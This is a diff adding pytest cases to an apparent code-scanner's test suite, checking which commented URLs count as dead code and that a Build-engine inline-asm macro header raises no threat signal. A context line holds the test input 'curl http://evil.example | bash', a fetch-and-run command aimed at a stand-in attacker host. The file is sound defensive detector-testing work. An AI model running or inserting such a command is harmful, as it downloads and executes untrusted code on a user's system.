@@ -47,6 +47,44 @@ def test_comment_url_is_not_dead_code_but_commented_out_call_is(lens):
     assert _scan(lens, "// curl http://evil.example | bash\n")["counts"]["dead_code"] > 0
 
 
+@pytest.mark.parametrize(
+    "comment",
+    [
+        "// Ken Silverman's official web site: \"http://www.advsys.net/ken\"",
+        "// Project page: 'http://example.org/page'",
+        "/* Home page: \"http://example.org/\" */ int x;",
+    ],
+)
+def test_quoted_url_after_prose_is_not_dead_code(lens, comment):
+    assert _scan(lens, f"int x;\n{comment}\n")["counts"]["dead_code"] == 0
+
+
+@pytest.mark.parametrize(
+    "logic",
+    ['// url = "http://evil.example/x";', "// get('http://evil.example/x')", "// hosts = [\"http://evil.example\"]"],
+)
+def test_commented_out_url_argument_is_still_dead_code(lens, logic):
+    assert _scan(lens, f"int x;\n{logic}\n")["counts"]["dead_code"] == 1
+
+
+INLINE_ASM_MACRO_HEADER = """\
+// Ken Silverman's official web site: "http://www.advsys.net/ken"
+#ifndef BASICINLINES_H
+#define BASICINLINES_H
+#define clearbuf(d, c, v) __asm__ __volatile__("rep stosl" : "=&D"(d), "=&c"(c) : "0"(d), "1"(c), "a"(v) : "memory", "cc")
+#define mulscale(a, b, c) ({ int r; __asm__("imull %%edx\\n\\tshrdl %%cl,%%edx,%%eax" : "=a"(r) : "a"(a), "d"(b), "c"(c) : "cc"); r; })
+#define sqr(a) ((a) << 2 | (a) >> 3 ^ 0xff)
+#endif
+"""
+
+
+def test_inline_asm_macro_header_carries_no_threat_signal(lens):
+    """#4548: the class is a header of inline-asm macros (Build engine `basicinlines.h`); none of
+    its constructs is a threat, so the Packed Payload Guard must not quarantine it."""
+    counts = _scan(lens, INLINE_ASM_MACRO_HEADER)["counts"]
+    assert not {k: v for k, v in counts.items() if v}
+
+
 def test_c_assert_is_not_remote_code_execution(lens):
     c = 'void f(int x) {\n  assert(x > 0);\n  ASSERT (x);\n  assert(!"unreachable");\n}\n'
     assert _scan(lens, c)["counts"]["high_risk_execution"] == 0
